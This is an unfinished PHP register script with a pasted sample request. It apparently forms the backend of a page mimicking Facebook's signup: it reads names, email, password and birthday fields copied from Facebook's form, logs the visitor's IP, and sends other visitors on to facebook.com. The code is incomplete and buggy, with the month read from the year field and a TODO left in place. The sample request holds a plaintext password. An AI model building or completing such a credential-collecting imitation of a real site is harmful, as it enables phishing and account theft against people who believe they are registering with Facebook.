<?php
// Require...
require('/config.inc.php');
if($_GET['register'] != "true"){
	header("Location: https://facebook.com/");
	die();
}

// Set variables
$reg_firstname = $_POST['firstname'];
$reg_lastname = $_POST['lastname'];
$reg_email = $_POST['reg_email__'];
$reg_email_confirmation = $_POST['reg_email_confirmation__'];
$reg_passwd = $_POST['reg_passwd__'];
$reg_birthday_day = $_POST['birthday_day'];
$reg_birthday_month = $_POST['reg_birthday_year'];
$reg_sex = $_POST['sex'];
$reg_locale = $_POST['locale'];
$reg_user_ip = getIp();
$reg_meta_user_ip = getMetaIp();
$missing = array();

if(empty($reg_firstname)){
	$missing[] = "Firstname missing";
}

if(empty($reg_lastname)){
	$missing[] = "Lastname missing";
}

function emptycheck($var){
	if(!empty($var)){
		return true;
	}
}

// TODO: Insert rest variable empty checks

if(!empty($missing)){
	$complete = "false";
}else{
	$complete = "true";
}


http://localhost/register.php?
lsd=AVoen1BA&
firstname=voornaampiemn&
lastname=achternaampiemn&
reg_email__=MienEMAIL%40emailfirst.nl&
reg_email_confirmation__=MienEMAIL%40emailconfirm.nl&
reg_passwd__=Th1%241s%5EMyPassword&
birthday_day=6&
birthday_month=10&
birthday_year=1997&
sex=2&w
ebsubmit=&
referrer=&
asked_to_login=0&
terms=on&
ab_test_data=AGAMlf4%2FSsfllZSGGMGMSMGGAAAAMGGSGGAAAAAGDQu%2F2VKAAAuDCj&
contactpoint_label=email_or_phone&
locale=nl_NL&
reg_instance=UMcWVX2AX7h7jueo22lU9qCo&
captcha_persist_data=AZkxVum1WAUrKrrdzPzOLgSzJc3lDrFaEZXP4aKFp0kvaJCTVVAkEi-56cfIqvtaaDZlPP8JVAO9U8SziqoN--9G90KfGMI2Goz2ujBSWKq5RywvIGq1oxtWsb6LyGrTyr_rcoPe7P_X31bk4GxlC4cHcTv8pGIkcjBIdAb52U0SVcg005kS51X86FoggBUtOlLJwbG3ToDneMB-0ehePrz7vpW3AO8AIa0PZlC8IflEy003fqX-O21rbTKCX6mTzqiZd64S9OR1dXrSM_Ugtf7BtRmMHXcn7rLu4lqxRea__hsfv2LHl_XvTJ1yEI1zuDl-m-wFlQzF4pQ6VQTu3eaPV8c2JTSl9QFgV1pr0IolDknVxobuvzUfl0DrIrpzGCg&
captcha_session=-Ltzw4XyxHP9EKhBS_WptA&
extra_challenge_params=authp%3Dnonce.tt.time.new_audio_default%26psig%3DKAJmVKyeqXRLo9FgsNQFsaRMffw%26nonce%3D-Ltzw4XyxHP9EKhBS_WptA%26tt%3DC95W8t6agDBMTSjM0a-i02RdS_8%26time%3D1477735292%26new_audio_default%3D1&
recaptcha_type=password&
captcha_response=&
qsstamp=W1tbMjMsMzksNTQsNjUsNzksODIsOTksMTEyLDExNywxNDUsMTUzLDE3MSwxODcsMTk5LDIxMCwyNDEsMjQ1LDI2NywyNjksMjcyLDI3NSwzMDYsMzEyLDMxNiwzMTcsMzE4LDMyMCwzNDksMzc1LDM3NywzODYsMzg3LDQwOCw0MTcsNDIwLDQyNiw0MzEsNDMyLDQ3Miw0ODksNjQwLDcxM11dLCJBWm0yY1VaNXRyeUowUmRVLU9GWkJDSUJtRG9FWl9mUk16cnVaTm1wOGh1MEMybTdGWUl0ZVF5U001c3p4b1paS0ZVOFJ3cUVrYUlXSEhIQzZQR3F1M3g3M0pBUHpfNUxpLXd4eXRGWVllU1Nwb2NkdXVNdnZjVS05OXNoUHRzcHFaZHRvUElHQko4b2oyR0lYWXp0eGxyQmhybG1GWXBBVzRodXhOTHA0bmp3RTZTNHdyUHhLSXUzRjU4a0Zyd1pyTXRFZzNjTWZXZEdGQkVsZ29NMmpua2YiXQ%3D%3D